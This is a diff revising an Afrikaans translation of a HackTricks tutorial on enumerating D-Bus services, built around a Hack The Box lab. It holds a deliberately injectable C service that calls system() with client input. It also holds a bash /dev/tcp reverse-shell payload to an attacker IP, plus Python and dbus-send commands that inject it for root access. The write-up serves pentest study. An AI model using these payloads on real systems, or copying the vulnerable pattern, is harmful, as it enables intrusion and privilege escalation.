@@ -1,27 +1,27 @@
-# D-Bus Enumerasie & Opdraginspuiting Voorregverhoging
+# D-Bus Enumerasie & Opdrag Inspuiting Privilege Escalation
 
 {% hint style="success" %}
-Leer & oefen AWS Hack: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
 ## **GUI enumerasie**
 
-D-Bus word gebruik as die interproseskommunikasie (IPC) bemiddelaar in Ubuntu-desktopomgewings. Op Ubuntu word die gelyktydige werking van verskeie boodskapbusse waargeneem: die stelselbus, hoofsaaklik gebruik deur **bevoorregte dienste om dienste bloot te stel wat regoor die stelsel relevant is**, en 'n sessiebus vir elke ingeteken gebruiker, wat slegs dienste blootstel wat net vir daardie spesifieke gebruiker relevant is. Die fokus hier is hoofsaaklik op die stelselbus weens sy assosiasie met dienste wat met hoër voorregte (bv., root) hardloop, aangesien ons doel is om voorregte te verhoog. Daar word opgemerk dat D-Bus se argitektuur 'n 'roeteerder' per sessiebus gebruik, wat verantwoordelik is vir die omleiding van kliëntboodskappe na die toepaslike dienste gebaseer op die adres wat deur die kliënte vir die diens wat hulle wil kommunikeer mee gespesifiseer is.
+D-Bus word gebruik as die inter-proses kommunikasie (IPC) mediator in Ubuntu desktop omgewings. Op Ubuntu word die gelyktydige werking van verskeie boodskapbusse waargeneem: die stelselsbus, wat hoofsaaklik deur **bevoegde dienste gebruik word om dienste wat relevant is oor die stelsel bloot te stel**, en 'n sessiebus vir elke ingelogde gebruiker, wat dienste blootstel wat slegs relevant is vir daardie spesifieke gebruiker. Die fokus hier is hoofsaaklik op die stelselsbus weens die verband met dienste wat op hoër bevoegdhede (bv. root) loop, aangesien ons doel is om bevoegdhede te verhoog. Dit word opgemerk dat D-Bus se argitektuur 'n 'router' per sessiebus gebruik, wat verantwoordelik is vir die herleiding van kliëntboodskappe na die toepaslike dienste gebaseer op die adres wat deur die kliënte vir die diens wat hulle wil kommunikeer, gespesifiseer is.
 
-Dienste op D-Bus word gedefinieer deur die **voorwerpe** en **koppelvlakke** wat hulle blootstel. Voorwerpe kan vergelyk word met klasinstansies in standaard OOP-tale, met elke instansie uniek geïdentifiseer deur 'n **voorwerppad**. Hierdie pad, soortgelyk aan 'n lêersisteempad, identifiseer elke voorwerp wat deur die diens blootgestel word uniek. 'n Sleutelkoppelvlak vir navorsingsdoeleindes is die **org.freedesktop.DBus.Introspectable**-koppelvlak, wat 'n enkele metode, Introspect, bevat. Hierdie metode gee 'n XML-voorstelling van die ondersteunde metodes van die voorwerp, seine, en eienskappe, met 'n fokus hier op metodes terwyl eienskappe en seine uitgelaat word.
+Dienste op D-Bus word gedefinieer deur die **objekte** en **interfaces** wat hulle blootstel. Objekte kan vergelyk word met klasinstansies in standaard OOP tale, met elke instansie uniek geïdentifiseer deur 'n **objekpad**. Hierdie pad, soortgelyk aan 'n lêerstelselpunt, identifiseer uniek elke objek wat deur die diens blootgestel word. 'n Sleutelinterface vir navorsingsdoeleindes is die **org.freedesktop.DBus.Introspectable** interface, wat 'n enkele metode, Introspect, bevat. Hierdie metode keer 'n XML voorstelling van die objek se ondersteunende metodes, seine, en eienskappe terug, met 'n fokus hier op metodes terwyl eienskappe en seine weggelaat word.
 
-Vir kommunikasie met die D-Bus-koppelvlak is twee gereedskappe gebruik: 'n CLI-gereedskap genaamd **gdbus** vir maklike aanroeping van metodes wat deur D-Bus in skripte blootgestel word, en [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), 'n op Python-gebaseerde GUI-gereedskap wat ontwerp is om die beskikbare dienste op elke bus te enumereer en die voorwerpe wat binne elke diens bevat word, te vertoon.
+Vir kommunikasie met die D-Bus interface, is twee gereedskap gebruik: 'n CLI-gereedskap genaamd **gdbus** vir maklike aanroep van metodes wat deur D-Bus in skripte blootgestel word, en [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), 'n Python-gebaseerde GUI-gereedskap wat ontwerp is om die dienste wat beskikbaar is op elke bus te enumerate en om die objekte wat in elke diens bevat is, te vertoon.
 ```bash
 sudo apt-get install d-feet
 ```
@@ -30,21 +30,21 @@ sudo apt-get install d-feet
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
 
-In die eerste afbeelding word dienste geregistreer met die D-Bus stelselbus, met **org.debin.apt** spesifiek uitgelig na die kies van die Stelselbus knoppie. D-Feet ondersoek hierdie diens vir objekte, wat koppelvlakke, metodes, eienskappe, en seine vir gekose objekte vertoon, soos gesien in die tweede afbeelding. Die handtekening van elke metode word ook in detail beskryf.
+In die eerste beeld word dienste wat geregistreer is met die D-Bus stelselsbus getoon, met **org.debin.apt** spesifiek uitgelig na die keuse van die Stelselsbus-knoppie. D-Feet vra hierdie diens vir voorwerpe, wat interfaces, metodes, eienskappe en seine vir gekose voorwerpe vertoon, soos gesien in die tweede beeld. Elke metode se handtekening is ook gedetailleerd.
 
-'n Merkwaardige kenmerk is die vertoning van die diens se **proses-ID (pid)** en **opdraglyn**, nuttig vir die bevestiging of die diens met verhoogde voorregte loop, belangrik vir navorsingsrelevantie.
+'n Opmerklike kenmerk is die vertoning van die diens se **proses ID (pid)** en **opdraglyn**, nuttig om te bevestig of die diens met verhoogde voorregte loop, belangrik vir navorsingsrelevansie.
 
-**D-Feet laat ook metode-aanroeping toe**: gebruikers kan Python-uitdrukkings as parameters invoer, wat D-Feet na D-Bus-tipes omskakel voordat dit na die diens gestuur word.
+**D-Feet laat ook metode-aanroep toe**: gebruikers kan Python-uitdrukkings as parameters invoer, wat D-Feet na D-Bus tipes omskakel voordat dit aan die diens oorgedra word.
 
-Let egter daarop dat **sekere metodes verifikasie vereis** voordat ons hulle kan aanroep. Ons sal hierdie metodes ignoreer, aangesien ons doel is om ons voorregte te verhoog sonder geloofsbriewe in die eerste plek.
+Let egter daarop dat **sommige metodes verifikasie vereis** voordat ons dit kan aanroep. Ons sal hierdie metodes ignoreer, aangesien ons doel is om ons voorregte te verhoog sonder om eers inligting te hê.
 
-Let ook daarop dat sommige van die dienste 'n ander D-Bus-diens ondersoek met die naam org.freedeskto.PolicyKit1 of 'n gebruiker toegelaat moet word om sekere aksies uit te voer of nie.
+Let ook daarop dat sommige van die dienste 'n ander D-Bus diens genaamd org.freedeskto.PolicyKit1 vra of 'n gebruiker toegelaat moet word om sekere aksies uit te voer of nie.
 
-## **Opdraglyn Opmaking**
+## **Cmd lyn Enumerasie**
 
-### Lys Diensobjekte
+### Lys Diens Voorwerpe
 
-Dit is moontlik om geopende D-Bus-koppelvlakke te lys met:
+Dit is moontlik om geopende D-Bus interfaces te lys met:
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -68,13 +68,13 @@ org.freedesktop.PolicyKit1               - -               -                (act
 org.freedesktop.hostname1                - -               -                (activatable) -                         -
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
-#### Verbindings
+#### Verbindinge
 
-[Vanaf Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wanneer 'n proses 'n verbinding met 'n bus opstel, ken die bus aan die verbinding 'n spesiale busnaam toe wat _unieke verbindingsnaam_ genoem word. Busname van hierdie tipe is onveranderlik—dit word gewaarborg dat hulle nie sal verander solank die verbinding bestaan nie—en, nog belangriker, hulle kan nie hergebruik word gedurende die leeftyd van die bus nie. Dit beteken dat geen ander verbinding met daardie bus ooit so 'n unieke verbindingsnaam toegewys sal kry nie, selfs as dieselfde proses die verbinding met die bus afsluit en 'n nuwe een skep. Unieke verbindingsname is maklik herkenbaar omdat hulle begin met die—andersins verbode—kolonkarakter.
+[Van wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wanneer 'n proses 'n verbinding met 'n bus opstel, ken die bus 'n spesiale busnaam aan die verbinding toe wat _unieke verbindingsnaam_ genoem word. Busname van hierdie tipe is onveranderlik—dit is gewaarborg dat hulle nie sal verander solank die verbinding bestaan nie—en, meer belangrik, hulle kan nie hergebruik word gedurende die bus se lewensduur nie. Dit beteken dat geen ander verbinding met daardie bus ooit so 'n unieke verbindingsnaam toegeken sal word nie, selfs al sluit dieselfde proses die verbinding met die bus en skep 'n nuwe. Unieke verbindingsname is maklik herkenbaar omdat hulle begin met die—andersins verbode—dubbelepuntkarakter.
 
-### Diensobjekinligting
+### Diensobjek Inligting
 
-Dan kan jy 'n bietjie inligting oor die koppelvlak verkry met:
+Dan kan jy 'n paar inligting oor die koppelvlak verkry met:
 ```bash
 busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
 
@@ -134,7 +134,7 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### Lys van Koppelvlakke van 'n Diensvoorwerp
+### Lys Interfaces van 'n Diensobjek
 
 Jy moet genoeg regte hê.
 ```bash
@@ -144,9 +144,9 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 └─/htb/oouch
 └─/htb/oouch/Block
 ```
-### Inspekteer die Koppelvlak van 'n Diensvoorwerp
+### Introspect Interface of a Service Object
 
-Merk op hoe in hierdie voorbeeld die jongste koppelvlak wat ontdek is, gekies is deur die `tree` parameter te gebruik (_sien vorige afdeling_):
+Let op hoe in hierdie voorbeeld die nuutste interface gekies is wat ontdek is met die `tree` parameter (_sien vorige afdeling_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -164,16 +164,16 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-Noteer die metode `.Block` van die koppelvlak `htb.oouch.Block` (die een waarin ons belangstel). Die "s" van die ander kolomme mag beteken dat dit 'n string verwag.
+Note die metode `.Block` van die interface `htb.oouch.Block` (die een waarin ons belangstel). Die "s" van die ander kolomme kan beteken dat dit 'n string verwag.
 
-### Monitor/Vaslegging Koppelvlak
+### Monitor/Vang Interface
 
 Met genoeg voorregte (net `send_destination` en `receive_sender` voorregte is nie genoeg nie) kan jy **'n D-Bus kommunikasie monitor**.
 
-Om 'n **kommunikasie** te **monitor** sal jy as **root** moet wees. As jy nog probleme ondervind om as root te wees, kyk na [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) en [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+Om te **monitor** 'n **kommunikasie** moet jy **root** wees. As jy steeds probleme ondervind om root te wees, kyk [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) en [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 {% hint style="warning" %}
-As jy weet hoe om 'n D-Bus konfigurasie lêer te konfigureer om **nie-root gebruikers toe te laat om** die kommunikasie te **sniff nie, kontak my asseblief!
+As jy weet hoe om 'n D-Bus konfigurasie lêer te konfigureer om **nie-root gebruikers toe te laat om** die kommunikasie te snuffel, kontak asseblief **my**!
 {% endhint %}
 
 Verskillende maniere om te monitor:
@@ -182,7 +182,7 @@ sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-In die volgende voorbeeld word die koppelvlak `htb.oouch.Block` gemonitor en **die boodskap "**_**lalalalal**_**" word deur misverstand gestuur**:
+In die volgende voorbeeld word die koppelvlak `htb.oouch.Block` gemonitor en **word die boodskap "**_**lalalalal**_**" deur miskommunikasie gestuur**:
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -201,13 +201,15 @@ MESSAGE "s" {
 STRING "Carried out :D";
 };
 ```
+U kan `capture` gebruik in plaas van `monitor` om die resultate in 'n pcap-lêer te stoor.
+
 #### Filtrering van al die geraas <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-As daar net te veel inligting op die bus is, stuur 'n ooreenstemmingsreël soos volg:
+As daar net te veel inligting op die bus is, gebruik 'n ooreenkomsreël soos volg:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-Verskeie reëls kan gespesifiseer word. As 'n boodskap aan _enige_ van die reëls voldoen, sal die boodskap afgedruk word. Soos dit:
+Meerdere reëls kan gespesifiseer word. As 'n boodskap _enige_ van die reëls ooreenstem, sal die boodskap gedruk word. So:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -215,15 +217,15 @@ dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```bash
 dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
-Sien die [D-Bus-dokumentasie](http://dbus.freedesktop.org/doc/dbus-specification.html) vir meer inligting oor ooreenstemmingsreël sintaksis.
+Sien die [D-Bus dokumentasie](http://dbus.freedesktop.org/doc/dbus-specification.html) vir meer inligting oor die sintaksis van wedstrydreëls.
 
 ### Meer
 
-`busctl` het selfs meer opsies, [**vind almal hier**](https://www.freedesktop.org/software/systemd/man/busctl.html).
+`busctl` het selfs meer opsies, [**vind al hulle hier**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
-## **Kwesbare Skenario**
+## **Kwetsbare Scenario**
 
-As gebruiker **qtc binne die gasheer "oouch" van HTB** kan jy 'n **onverwagte D-Bus-konfigurasie lêer** vind wat in _/etc/dbus-1/system.d/htb.oouch.Block.conf_ geleë is:
+As gebruiker **qtc binne die gasheer "oouch" van HTB** kan jy 'n **onverwagte D-Bus konfigurasie lêer** vind geleë in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
@@ -244,9 +246,9 @@ As gebruiker **qtc binne die gasheer "oouch" van HTB** kan jy 'n **onverwagte D-
 
 </busconfig>
 ```
-Merk op uit die vorige konfigurasie dat **jy die gebruiker `root` of `www-data` sal moet wees om inligting te stuur en te ontvang** via hierdie D-BUS kommunikasie.
+Nota van die vorige konfigurasie dat **jy die gebruiker `root` of `www-data` moet wees om inligting te stuur en te ontvang** via hierdie D-BUS kommunikasie.
 
-As gebruiker **qtc** binne die docker houer **aeb4525789d8** kan jy 'n paar dbus-verwante kode vind in die lêer _/code/oouch/routes.py._ Dit is die interessante kode:
+As gebruiker **qtc** binne die docker houer **aeb4525789d8** kan jy 'n paar dbus verwante kode in die lêer _/code/oouch/routes.py._ vind. Dit is die interessante kode:
 ```python
 if primitive_xss.search(form.textfield.data):
 bus = dbus.SystemBus()
@@ -258,14 +260,14 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-Soos u kan sien, dit is **verbind met 'n D-Bus-koppelvlak** en stuur na die **"Block" funksie** die "client\_ip".
+As you can see, it is **verbinding maak met 'n D-Bus-koppelvlak** en stuur na die **"Block" funksie** die "client\_ip".
 
-Aan die ander kant van die D-Bus-koppelvlak is daar 'n C-saamgestelde binêre lopende. Hierdie kode is **luisterend** in die D-Bus-koppelvlak **vir IP-adres en roep iptables aan via die `system`-funksie** om die gegewe IP-adres te blokkeer.\
-**Die oproep na `system` is opsetlik vatbaar vir bevelinspuiting**, so 'n lading soos die volgende sal 'n omgekeerde dop skep: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+Aan die ander kant van die D-Bus-verbinding is daar 'n C-gecompileerde binêre wat loop. Hierdie kode is **luister** in die D-Bus-verbinding **vir IP-adres en roep iptables aan via `system` funksie** om die gegewe IP-adres te blokkeer.\
+**Die oproep na `system` is doelbewus kwesbaar vir opdraginjekie**, so 'n payload soos die volgende sal 'n omgekeerde shell skep: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-### Exploiteer dit
+### Exploit dit
 
-Aan die einde van hierdie bladsy kan u die **volledige C-kode van die D-Bus-aansoek** vind. Binne-in kan u tussen die lyne 91-97 vind **hoe die `D-Bus objekpaadjie`** **en `koppelvlaknaam`** is **geregistreer**. Hierdie inligting sal nodig wees om inligting na die D-Bus-koppelvlak te stuur:
+Aan die einde van hierdie bladsy kan jy die **volledige C-kode van die D-Bus-toepassing** vind. Binne dit kan jy tussen die lyne 91-97 **hoe die `D-Bus objek pad`** **en `koppelvlak naam`** ** geregistreer** word. Hierdie inligting sal nodig wees om inligting na die D-Bus-verbinding te stuur:
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -275,13 +277,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Ook, in lyn 57 kan jy vind dat **die enigste metode geregistreer** vir hierdie D-Bus kommunikasie genoem word `Block`(_**Dit is waarom in die volgende afdeling die payloads na die diensobjek `htb.oouch.Block`, die koppelvlak `/htb/oouch/Block` en die metode naam `Block` gestuur gaan word**_):
+Ook, in lyn 57 kan jy vind dat **die enigste metode geregistreer** vir hierdie D-Bus kommunikasie genoem word `Block`(_**Dit is hoekom in die volgende afdeling die payloads na die diens objek `htb.oouch.Block`, die koppelvlak `/htb/oouch/Block` en die metodenaam `Block` gestuur gaan word**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Die volgende Python-kode sal die lading stuur na die D-Bus verbinding na die `Block` metode via `block_iface.Block(runme)` (_let wel dat dit uit die vorige stuk kode onttrek is_):
+Die volgende python kode sal die payload na die D-Bus verbinding stuur na die `Block` metode via `block_iface.Block(runme)` (_let op dat dit uit die vorige stuk kode onttrek is_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -295,16 +297,16 @@ bus.close()
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-* `dbus-send` is 'n gereedskap wat gebruik word om 'n boodskap na die "Boodskapbus" te stuur.
-* Boodskapbus - 'n sagteware wat deur stelsels gebruik word om kommunikasie tussen aansoeke maklik te maak. Dit is verwant aan 'n Boodskapry (boodskappe is in volgorde georden) maar in 'n Boodskapbus word die boodskappe gestuur in 'n intekenmodel en ook baie vinnig.
-* Die "-stelsel" etiket word gebruik om aan te dui dat dit 'n stelselboodskap is, nie 'n sessieboodskap (standaard).
-* Die "--druk-antwoord" etiket word gebruik om ons boodskap toepaslik af te druk en enige antwoorde in 'n mens-leesbare formaat te ontvang.
-* "--dest=Dbus-Interface-Blok" Die adres van die Dbus-inferface.
-* "--string:" - Tipe boodskap wat ons graag na die inferface wil stuur. Daar is verskeie formate om boodskappe te stuur soos dubbel, bytes, booleans, int, objekpad. Uit hiervan is die "objekpad" nuttig wanneer ons 'n pad van 'n lêer na die Dbus-inferface wil stuur. Ons kan in hierdie geval 'n spesiale lêer (FIFO) gebruik om 'n bevel na die inferface te stuur onder die naam van 'n lêer. "string:;" - Dit is om die objekpad weer te roep waar ons die plek van FIFO-omgekeerde doplêer/lêer plaas.
-  
-_Merk op dat in `htb.oouch.Block.Block`, die eerste deel (`htb.oouch.Block`) na die diensobjek verwys en die laaste deel (`.Block`) na die metode naam verwys._
+* `dbus-send` is 'n hulpmiddel wat gebruik word om boodskappe na “Message Bus” te stuur
+* Message Bus – 'n sagteware wat deur stelsels gebruik word om kommunikasie tussen toepassings maklik te maak. Dit is verwant aan Message Queue (boodskappe is in volgorde) maar in Message Bus word die boodskappe in 'n subskripsiemodel gestuur en ook baie vinnig.
+* “-system” etiket word gebruik om te noem dat dit 'n stelselsboodskap is, nie 'n sessieboodskap nie (per standaard).
+* “–print-reply” etiket word gebruik om ons boodskap toepaslik te druk en enige antwoorde in 'n menslike leesbare formaat te ontvang.
+* “–dest=Dbus-Interface-Block” Die adres van die Dbus-koppelvlak.
+* “–string:” – Tipe boodskap wat ons wil stuur na die koppelvlak. Daar is verskeie formate om boodskappe te stuur soos dubbel, bytes, booleans, int, objpath. Van hierdie, is die “object path” nuttig wanneer ons 'n pad van 'n lêer na die Dbus-koppelvlak wil stuur. Ons kan 'n spesiale lêer (FIFO) in hierdie geval gebruik om 'n opdrag na die koppelvlak te stuur in die naam van 'n lêer. “string:;” – Dit is om die objekpad weer aan te roep waar ons die FIFO omgekeerde skulp lêer/opdrag plaas.
 
-### C-kode
+_Note dat in `htb.oouch.Block.Block`, die eerste deel (`htb.oouch.Block`) verwys na die diensobjek en die laaste deel (`.Block`) verwys na die metode naam._
+
+### C code
 
 {% code title="d-bus_server.c" %}
 ```c
@@ -453,16 +455,16 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 * [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Ondersteun HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
